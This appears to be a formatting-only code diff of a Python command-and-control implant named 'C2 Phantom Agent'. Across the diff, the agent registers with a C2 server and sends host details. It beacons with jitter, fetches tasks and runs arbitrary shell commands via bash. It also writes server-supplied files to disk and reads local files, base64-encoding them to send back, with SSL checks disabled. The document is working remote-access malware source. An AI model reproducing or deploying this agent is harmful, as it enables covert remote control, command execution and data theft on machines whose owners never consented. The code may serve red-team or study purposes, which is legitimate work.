@@ -20,14 +20,14 @@ import aiohttp
 class C2Agent:
     """
     C2 Agent that runs on target system.
-    
+
     Registers with C2 server, receives commands, executes them, and returns results.
     """
 
     def __init__(self, c2_server_url: str, beacon_interval: int = 60, jitter: int = 30) -> None:
         """
         Initialize C2 agent.
-        
+
         Args:
             c2_server_url: C2 server URL
             beacon_interval: Beacon interval in seconds
@@ -43,7 +43,7 @@ class C2Agent:
     async def register(self) -> bool:
         """
         Register with C2 server.
-        
+
         Returns:
             True if registration successful
         """
@@ -55,14 +55,14 @@ class C2Agent:
                 "os": platform.system(),
                 "os_version": platform.version(),
                 "architecture": platform.machine(),
-                "python_version": sys.version.split()[0]
+                "python_version": sys.version.split()[0],
             }
 
             async with aiohttp.ClientSession() as session:
                 async with session.post(
                     f"{self.c2_server_url}/register",
                     json=system_info,
-                    ssl=False  # For testing; use proper SSL in production
+                    ssl=False,  # For testing; use proper SSL in production
                 ) as response:
                     if response.status == 200:
                         data = await response.json()
@@ -70,7 +70,7 @@ class C2Agent:
                         self.encryption_key = data.get("encryption_key")
                         self.beacon_interval = data.get("beacon_interval", self.beacon_interval)
                         self.jitter = data.get("jitter", self.jitter)
-                        
+
                         print(f"[+] Registered with C2 server, session ID: {self.session_id}")
                         return True
                     else:
@@ -84,16 +84,14 @@ class C2Agent:
     async def beacon(self) -> Dict[str, Any]:
         """
         Send beacon to C2 server.
-        
+
         Returns:
             Beacon response data
         """
         try:
             async with aiohttp.ClientSession() as session:
                 async with session.post(
-                    f"{self.c2_server_url}/beacon",
-                    json={"session_id": self.session_id},
-                    ssl=False
+                    f"{self.c2_server_url}/beacon", json={"session_id": self.session_id}, ssl=False
                 ) as response:
                     if response.status == 200:
                         return await response.json()
@@ -108,16 +106,13 @@ class C2Agent:
     async def get_tasks(self) -> list:
         """
         Retrieve tasks from C2 server.
-        
+
         Returns:
             List of tasks to execute
         """
         try:
             async with aiohttp.ClientSession() as session:
-                async with session.get(
-                    f"{self.c2_server_url}/tasks/{self.session_id}",
-                    ssl=False
-                ) as response:
+                async with session.get(f"{self.c2_server_url}/tasks/{self.session_id}", ssl=False) as response:
                     if response.status == 200:
                         data = await response.json()
                         return data.get("tasks", [])
@@ -131,10 +126,10 @@ class C2Agent:
     async def execute_command(self, command: str) -> Dict[str, Any]:
         """
         Execute a shell command.
-        
+
         Args:
             command: Command to execute
-            
+
         Returns:
             Execution result
         """
@@ -146,20 +141,15 @@ class C2Agent:
                 shell_cmd = ["/bin/bash", "-c", command]
 
             # Execute command
-            process = subprocess.Popen(
-                shell_cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
-            )
-            
+            process = subprocess.Popen(shell_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
             stdout, stderr = process.communicate(timeout=300)  # 5 minute timeout
-            
+
             return {
                 "output": stdout,
                 "error": stderr,
                 "exit_code": process.returncode,
-                "timestamp": datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat(),
             }
 
         except subprocess.TimeoutExpired:
@@ -168,38 +158,28 @@ class C2Agent:
                 "output": "",
                 "error": "Command timed out after 5 minutes",
                 "exit_code": -1,
-                "timestamp": datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat(),
             }
         except Exception as e:
-            return {
-                "output": "",
-                "error": str(e),
-                "exit_code": -1,
-                "timestamp": datetime.now().isoformat()
-            }
+            return {"output": "", "error": str(e), "exit_code": -1, "timestamp": datetime.now().isoformat()}
 
     async def post_results(self, task_id: str, results: Dict[str, Any]) -> bool:
         """
         Post command results back to C2 server.
-        
+
         Args:
             task_id: Task ID
             results: Execution results
-            
+
         Returns:
             True if successful
         """
         try:
-            data = {
-                "task_id": task_id,
-                **results
-            }
+            data = {"task_id": task_id, **results}
 
             async with aiohttp.ClientSession() as session:
                 async with session.post(
-                    f"{self.c2_server_url}/results/{self.session_id}",
-                    json=data,
-                    ssl=False
+                    f"{self.c2_server_url}/results/{self.session_id}", json=data, ssl=False
                 ) as response:
                     return response.status == 200
 
@@ -210,98 +190,86 @@ class C2Agent:
     async def upload_file(self, remote_path: str, file_data_b64: str) -> Dict[str, Any]:
         """
         Write uploaded file to disk.
-        
+
         Args:
             remote_path: Path where to write file
             file_data_b64: Base64 encoded file data
-            
+
         Returns:
             Upload result
         """
         try:
             import base64
             from pathlib import Path
-            
+
             # Decode base64 data
             file_data = base64.b64decode(file_data_b64)
-            
+
             # Create directory if needed
             Path(remote_path).parent.mkdir(parents=True, exist_ok=True)
-            
+
             # Write file
             with open(remote_path, "wb") as f:
                 f.write(file_data)
-            
+
             return {
                 "status": "success",
                 "path": remote_path,
                 "size": len(file_data),
-                "timestamp": datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat(),
             }
-            
+
         except Exception as e:
-            return {
-                "status": "error",
-                "error": str(e),
-                "timestamp": datetime.now().isoformat()
-            }
+            return {"status": "error", "error": str(e), "timestamp": datetime.now().isoformat()}
 
     async def download_file(self, local_path: str) -> Dict[str, Any]:
         """
         Read file from disk and encode for download.
-        
+
         Args:
             local_path: Path to file to download
-            
+
         Returns:
             Download result with base64 encoded data
         """
         try:
             import base64
             from pathlib import Path
-            
+
             file_path = Path(local_path)
-            
+
             if not file_path.exists():
-                return {
-                    "status": "error",
-                    "error": "File not found",
-                    "timestamp": datetime.now().isoformat()
-                }
-            
+                return {"status": "error", "error": "File not found", "timestamp": datetime.now().isoformat()}
+
             # Read and encode file
             with open(file_path, "rb") as f:
                 file_data = f.read()
-            
+
             encoded_data = base64.b64encode(file_data).decode()
-            
+
             return {
                 "status": "success",
                 "data": encoded_data,
                 "filename": file_path.name,
                 "size": len(file_data),
-                "timestamp": datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat(),
             }
-            
+
         except Exception as e:
-            return {
-                "status": "error",
-                "error": str(e),
-                "timestamp": datetime.now().isoformat()
-            }
+            return {"status": "error", "error": str(e), "timestamp": datetime.now().isoformat()}
 
     async def process_task(self, task: Dict[str, Any]) -> None:
         """
         Process a single task.
-        
+
         Args:
             task: Task to process
         """
         task_id = task.get("id")
         task_type = task.get("type")
-        
+
         print(f"[*] Processing task {task_id}: {task_type}")
-        
+
         if task_type == "execute":
             command = task.get("command")
             if command:
@@ -309,7 +277,7 @@ class C2Agent:
                 results = await self.execute_command(command)
                 await self.post_results(task_id, results)
                 print(f"[+] Task {task_id} completed")
-        
+
         elif task_type == "upload":
             remote_path = task.get("remote_path")
             file_data = task.get("data")
@@ -320,7 +288,7 @@ class C2Agent:
                 print(f"[+] Upload completed: {remote_path}")
             else:
                 print(f"[!] Invalid upload task data")
-        
+
         elif task_type == "download":
             local_path = task.get("path")
             if local_path:
@@ -330,14 +298,14 @@ class C2Agent:
                 print(f"[+] Download completed: {local_path}")
             else:
                 print(f"[!] Invalid download task data")
-        
+
         else:
             print(f"[!] Unknown task type: {task_type}")
 
     async def run(self) -> None:
         """
         Main agent loop.
-        
+
         Continuously beacons to C2 server, retrieves tasks, and executes them.
         """
         # Register with C2 server
@@ -352,19 +320,20 @@ class C2Agent:
             try:
                 # Send beacon
                 beacon_response = await self.beacon()
-                
+
                 # Check if there are tasks
                 if beacon_response.get("has_tasks"):
                     tasks = await self.get_tasks()
-                    
+
                     for task in tasks:
                         await self.process_task(task)
-                
+
                 # Sleep with jitter
                 import random
+
                 sleep_time = self.beacon_interval + random.randint(-self.jitter, self.jitter)
                 sleep_time = max(10, sleep_time)  # Minimum 10 seconds
-                
+
                 await asyncio.sleep(sleep_time)
 
             except KeyboardInterrupt:
@@ -383,16 +352,16 @@ class C2Agent:
 def main():
     """Main entry point for agent."""
     import argparse
-    
+
     parser = argparse.ArgumentParser(description="C2 Phantom Agent")
     parser.add_argument("--server", required=True, help="C2 server URL (e.g., http://localhost:8443)")
     parser.add_argument("--beacon", type=int, default=60, help="Beacon interval in seconds")
     parser.add_argument("--jitter", type=int, default=30, help="Beacon jitter in seconds")
-    
+
     args = parser.parse_args()
-    
+
     agent = C2Agent(args.server, args.beacon, args.jitter)
-    
+
     try:
         asyncio.run(agent.run())
     except KeyboardInterrupt:
